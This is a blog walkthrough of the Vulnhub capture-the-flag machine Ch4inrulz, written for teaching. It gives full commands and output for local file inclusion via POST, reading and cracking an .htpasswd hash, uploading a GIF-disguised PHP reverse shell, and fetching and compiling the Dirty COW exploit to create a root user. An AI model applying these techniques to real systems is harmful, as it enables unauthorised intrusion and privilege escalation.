---
layout:     post
title:      "Vulnhub.com - Ch4inrulz"
date:       2018-08-19 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to walk through a machine from Vulnhub called **Ch4inrulz**. 

{% highlight text %}
Frank has a small website and he is a smart developer with a normal security background , he always love to follow patterns , your goal is to discover any critical vulnerabilities and gain access to the system , then you need to gain root access in order to capture the root flag.

This machine was made for Jordan’s Top hacker 2018 CTF , we tried to make it simulate a real world attacks in order to improve your penetration testing skills.

The machine was tested on vmware (player / workstation) and works without any problems , so we recommend to use VMware to run it , Also works fine using virtualbox.

Difficulty: Intermediate , you need to think out of the box and collect all the puzzle pieces in order to get the job done.

The machine is already got DHCP enabled , so you will not have any problems with networking.

Happy Hacking !

v1 - 25/07/2018 v1.0.1 - 31/07/2018 *Fixes DHCP Issue*  
{% endhighlight %}

* Author: [mohammadaskar2](https://twitter.com/@mohammadaskar2)
* Download: [https://www.vulnhub.com/entry/ch4inrulz-101,247/](https://www.vulnhub.com/entry/ch4inrulz-101,247/)

### Solution

Firstly, we can do an `nmap` scan.

{% highlight text %}
root@kali:~# nmap -sC -sV -sS -A -v 10.0.0.14
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 12:36 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating ARP Ping Scan at 12:36
Scanning 10.0.0.14 [1 port]
Completed ARP Ping Scan at 12:36, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:36
Completed Parallel DNS resolution of 1 host. at 12:36, 0.00s elapsed
Initiating SYN Stealth Scan at 12:36
Scanning 10.0.0.14 [1000 ports]
Discovered open port 80/tcp on 10.0.0.14
Discovered open port 22/tcp on 10.0.0.14
Discovered open port 21/tcp on 10.0.0.14
Discovered open port 8011/tcp on 10.0.0.14
Completed SYN Stealth Scan at 12:36, 0.12s elapsed (1000 total ports)
Initiating Service scan at 12:36
Scanning 4 services on 10.0.0.14
Completed Service scan at 12:36, 11.03s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.14
NSE: Script scanning 10.0.0.14.
Initiating NSE at 12:36
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 12:36, 0.77s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Nmap scan report for 10.0.0.14
Host is up (0.00064s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: FRANK's Website | Under development
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:99:7D:E7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.19 - 2.6.36
Uptime guess: 497.101 days (since Thu Mar 30 10:11:48 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 10.0.0.14

NSE: Script Post-scanning.
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.354KB)
{% endhighlight %}

We can see a whole range of open ports `80` and `8011` for `http` servers, `21` for `ftp` and `22` for `ssh`. From the start I decided to check the `ftp` port for some publicly available files. 

{% highlight text %}
root@kali:~# ftp 10.0.0.14
Connected to 10.0.0.14.
220 (vsFTPd 2.3.5)
Name (10.0.0.14:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        111          4096 Apr 13 17:19 .
drwxr-xr-x    2 0        111          4096 Apr 13 17:19 ..
226 Directory send OK.
{% endhighlight %}

Unfortunately there's nothing in there, so my next step was to check `http` at port `80`. As it's pretty normal landing page, I decided to run a `dirb` scan for directories. 

{% highlight text %}
root@kali:~# dirb http://10.0.0.14

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 20 04:09:45 2018
URL_BASE: http://10.0.0.14/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.14/ ----
+ http://10.0.0.14/cgi-bin/ (CODE:403|SIZE:285)                                
==> DIRECTORY: http://10.0.0.14/css/                                           
+ http://10.0.0.14/development (CODE:401|SIZE:476)                             
==> DIRECTORY: http://10.0.0.14/img/                                           
+ http://10.0.0.14/index (CODE:200|SIZE:334)                                   
+ http://10.0.0.14/index.html (CODE:200|SIZE:13516)                            
==> DIRECTORY: http://10.0.0.14/js/                                            
+ http://10.0.0.14/LICENSE (CODE:200|SIZE:1093)                                
+ http://10.0.0.14/robots (CODE:200|SIZE:21)                                   
+ http://10.0.0.14/robots.txt (CODE:200|SIZE:21)                               
+ http://10.0.0.14/server-status (CODE:403|SIZE:290)                           
==> DIRECTORY: http://10.0.0.14/vendor/                                        
                                                                               
---- Entering directory: http://10.0.0.14/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Aug 20 04:09:49 2018
DOWNLOADED: 4612 - FOUND: 8
{% endhighlight %}

Here, we can see a `development` directory, which is protected by password, so I decided to move on and scan another `http` port - `8011`. 

{% highlight text %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.0.0.14:8011 -x .txt,.php,.html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.14:8011/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php,.html
=====================================================
/index.html (Status: 200)
/api (Status: 301)
=====================================================
{% endhighlight %}

An `/api/` directory? Let's check that.

{% highlight text %}
root@kali:~# curl 10.0.0.14:8011/api/
<title>FRANK's API | Under development</title>

<center><h2>This API will be used to communicate with Frank's server</h2></center>
<center><b>but it's still under development</b></center>
<center><p>* web_api.php</p></center>
<center><p>* records_api.php</p></center>
<center><p>* files_api.php</p></center>
<center><p>* database_api.php</p></center>
{% endhighlight %}

By checking all of these files, only `files_api.php` is present. 

{% highlight text %}
root@kali:~# curl 10.0.0.14:8011/api/web_api.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /api/web_api.php was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011</address>
</body></html>
root@kali:~# curl 10.0.0.14:8011/api/records_api.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /api/records_api.php was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011</address>
</body></html>
root@kali:~# curl 10.0.0.14:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

<p>No parameter called file passed to me</p><p>* Note : this API don't use json , so send the file name in raw format</p>
root@kali:~# curl 10.0.0.14:8011/api/database_api.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /api/database_api.php was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011</address>
</body></html>
{% endhighlight %}

We can see that it needs a `file` parameter, which we can do with `curl` and `/etc/passwd` file. 

{% highlight text %}
root@kali:~# curl http://10.0.0.14:8011/api/files_api.php?file=index.php

<head>
  <title>franks website | simple website browser API</title>
</head>

<b>********* HACKER DETECTED *********</b><p>YOUR IP IS : 10.0.0.4</p><p>WRONG INPUT !!</p>
{% endhighlight %}

Hmmm, it blocks our request. After a while of trying out different things, I've noticed that changing `GET` TO `POST` will allow us to return the correct ouptut - contents of `/etc/passwd`. 

{% highlight text %}
root@kali:~# curl -X POST -d file=/etc/passwd 10.0.0.14:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false
{% endhighlight %}

Okay, so as we can read files with that `api`, why don't we try and read the content of the `index` in `development` area?

{% highlight text %}
root@kali:~# curl -X POST -d file=/var/www/development/index.html 10.0.0.14:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

<title>my Development tools</title>
<b>* Here is my unfinished tools list</b>

<h4>- the uploader tool (finished but need security review)</h4>
{% endhighlight %}

More information, there's possibly a tool to upload files. But still, we need to get access so we can use it. For now only reading is possible. 

But as the protection is from the web server itself, we could possibly find information about in `.htaccess` file. 

{% highlight text %}
root@kali:~# curl -X POST -d file=/var/www/development/.htaccess 10.0.0.14:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

AuthUserFile /etc/.htpasswd
AuthName "Frank Development Area"
AuthType Basic
AuthGroupFile /dev/null

<Limit GET POST>

require valid-user

</Limit>
{% endhighlight %}

Great, let's get the `.htpasswd` file with the password to protected area. 

{% highlight text %}
root@kali:~# curl -X POST -d file=/etc/.htpasswd 10.0.0.14:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
{% endhighlight %}

Now we can crack the password with `johntheripper`. 

{% highlight text %}
root@kali:~# echo 'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0' > pass.txt
root@kali:~# john pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
frank!!!         (frank)
1g 0:00:00:00 DONE 1/3 (2018-08-14 09:10) 33.33g/s 6266p/s 6266c/s 6266C/s frank!!..fr4nk
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Not a hard password to brute force. 

![Development Area](/img/ch4inrulz/development.png){:class="img-responsive center-block"}

After logging in in, we can already move to the `/uploader` tool as previously discovered. 

![Uploader](/img/ch4inrulz/uploader.png){:class="img-responsive center-block"}

By uploading some test files, I've noticed that we can only upload images. But we can try to trick it by getting `php-reverse-shell` and adding `gif` file header into the exploit. 

{% highlight text %}
root@kali:~# vi php-reverse-shell.php
root@kali:~# file php-reverse-shell.php
php-reverse-shell.php: GIF image data, version 89a, 2570 x 16188
root@kali:~# cat php-reverse-shell.php
GIF89a

<?php

File is an image - image/gif.Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded. 
{% endhighlight%}

In addition, we have to change the extension of the shell. 

{% highlight text %}
root@kali:~# mv php-reverse-shell.php php-reverse-shell.gif

File is an image - image/gif.The file php-reverse-shell.gif has been uploaded to my uploads path. 
{% endhighlight %}

Now we have to find the `upload` path. This was the most time consuming part as `dirb` and `gobuster` with different wordlists didn't seem to find anything valuable. In addition, there were no clues in the system. 

After a few hours, I've found that `my uploads` may be just `frank uploads`. Still nothing, so after few more hours of fiddling, here we have `FRANKuploads`. We can now get to our uploaded reverse shell with file api, while running a listener. 

{% highlight text %}
root@kali:~# curl -X POST -d file=/var/www/development/uploader/FRANKuploads/php-reverse-shell.gif 10.0.0.14:8011/api/files_api.php

root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.14: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.14] 33643
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 05:38:18 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
{% endhighlight %}

First flag is in the home direcotory of `frank` user. 

{% highlight text %}
$ cd home
$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Apr 13 16:06 .
drwxr-xr-x 22 root  root  4096 Apr 13 16:10 ..
drwxr-xr-x  3 frank frank 4096 Apr 14 07:37 frank
$ cd frank
$ ls -la
total 36
drwxr-xr-x 3 frank frank 4096 Apr 14 07:37 .
drwxr-xr-x 3 root  root  4096 Apr 13 16:06 ..
-rw------- 1 frank frank   26 Jul 31 07:44 .bash_history
-rw-r--r-- 1 frank frank  220 Apr 13 16:06 .bash_logout
-rw-r--r-- 1 frank frank 3353 Apr 13 16:06 .bashrc
drwxr-xr-x 2 frank frank 4096 Apr 13 16:07 .cache
-rw-r--r-- 1 frank frank  675 Apr 13 16:06 .profile
-rw-r--r-- 1 frank frank    0 Apr 13 16:08 .sudo_as_admin_successful
-rw-r--r-- 1 frank frank   29 Apr 14 07:37 PE.txt
-rw-r--r-- 1 frank frank   33 Apr 14 07:36 user.txt
$ cat user.txt
4795aa2a9be22fac10e1c25794e75c1b
{% endhighlight %}

Now we have to get to the higher privileges. During usual enumeration, I've noticed that the only unusal thing in this system is outdated kernel.

{% highlight text %}
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/home/frank$ cat PE.txt
cat PE.txt
Try it as fast as you can ;)

www-data@ubuntu:/$ uname -a
uname -a
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
{% endhighlight %}

Now we just have to exlpoit the system using [this exploit](https://www.exploit-db.com/exploits/40839/).

{% highlight text %}
root@kali:~# wget https://www.exploit-db.com/raw/40839/
--2018-08-19 11:49:45--  https://www.exploit-db.com/raw/40839/
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: ‘index.html’

index.html          100%[===================>]   4.89K  --.-KB/s    in 0s      

2018-08-19 11:49:46 (43.5 MB/s) - ‘index.html’ saved [5006/5006]


root@kali:~# mv index.html exploit.c
root@kali:~# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.0.0.14 - - [19/Aug/2018 11:51:08] "GET /exploit.c HTTP/1.0" 200 -

www-data@ubuntu:/tmp$ mv exploit.c dirty.c                
mv exploit.c dirty.c
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt


www-data@ubuntu:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: test

Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: 7ffa136a2000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd


www-data@ubuntu:/tmp$ su firefart
su firefart
Password: test

firefart@ubuntu:/tmp# cd /root
cd /root
firefart@ubuntu:~# ls -la
ls -la
total 32
drwx------  4 firefart root 4096 2018-04-14 07:36 .
drwxr-xr-x 22 firefart root 4096 2018-04-13 16:10 ..
drwx------  2 firefart root 4096 2018-04-13 16:06 .aptitude
-rw-------  1 firefart root   82 2018-07-31 07:44 .bash_history
-rw-r--r--  1 firefart root 3106 2010-04-23 02:45 .bashrc
drwxr-xr-x  2 firefart root 4096 2018-04-14 07:32 .cache
-rw-r--r--  1 firefart root  140 2010-04-23 02:45 .profile
-rw-r--r--  1 firefart root   33 2018-04-14 07:36 root.txt
firefart@ubuntu:~# cat root.txt
cat root.txt
8f420533b79076cc99e9f95a1a4e5568
{% endhighlight %}